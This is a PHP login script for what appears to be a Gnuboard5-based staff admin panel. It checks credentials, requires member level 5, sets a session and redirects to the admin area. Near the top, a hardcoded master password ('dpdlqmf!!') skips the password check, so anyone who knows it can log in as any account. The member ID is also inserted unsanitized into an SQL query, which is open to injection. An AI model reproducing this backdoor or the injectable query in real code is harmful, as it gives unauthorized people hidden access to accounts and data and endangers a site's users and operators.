<?
	include_once("_common.php");

	$mb = get_member($mb_id);
	if($mb_password != "dpdlqmf!!"){
		if (!$is_social_password_check && (!$mb['mb_id'] || !check_password($mb_password, $mb['mb_password'])) ) {
			alert('가입된 회원아이디가 아니거나 비밀번호가 틀립니다.\\n비밀번호는 대소문자를 구분합니다.');
		}
	}

	
	$sql = "select * from g5_member where 1=1 and mb_id = '{$mb_id}'";
	$row = sql_fetch($sql);

	if($row['mb_level'] < 5){
		alert($config[cf_title]." 직원만 접속이 가능합니다.");
	}
	if($row['mb_leave_date']){
		alert("탈퇴한 아이디 입니다.");
	}

	

	set_session('ss_mb_id', $mb['mb_id']);
	set_session('ss_mb_key', md5($mb['mb_datetime'] . get_real_client_ip() . $_SERVER['HTTP_USER_AGENT']));

	/*$sql = "update g5_member set login_datetime = now() where lu_id = '{$lu_id}'";
	sql_query($sql);*/
	goto_url(G5_LADMIN_URL);

?>